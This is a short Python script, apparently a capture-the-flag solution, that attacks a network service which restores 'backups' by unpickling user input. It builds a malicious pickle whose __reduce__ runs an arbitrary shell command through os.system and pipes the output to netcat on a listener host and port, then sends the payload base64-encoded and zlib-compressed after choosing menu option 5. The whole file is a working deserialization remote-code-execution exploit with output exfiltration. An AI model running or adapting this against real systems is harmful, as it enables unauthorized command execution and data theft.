from pwn import *
import base64, subprocess, pickle, zlib, os

class Exploit(object):
	def __reduce__(self):
		global command, LH, LP
		return (os.system, ('{} | nc {} {}'.format(command, LH, LP),),)

command = 'ls'
if len(sys.argv) > 1:
	command=sys.argv[1]
# Your IP + Port
LH,LP='localhost',5555
# Remote IP + Port
H,P = 'localhost',1024
r = remote(H,P)
junk  = r.recvuntil('backup')
#print junk
r.sendline('5')
junk += r.recvuntil('Paste your backup here: ')
#print junk
r.sendline(base64.b64encode(zlib.compress(pickle.dumps(Exploit()))))

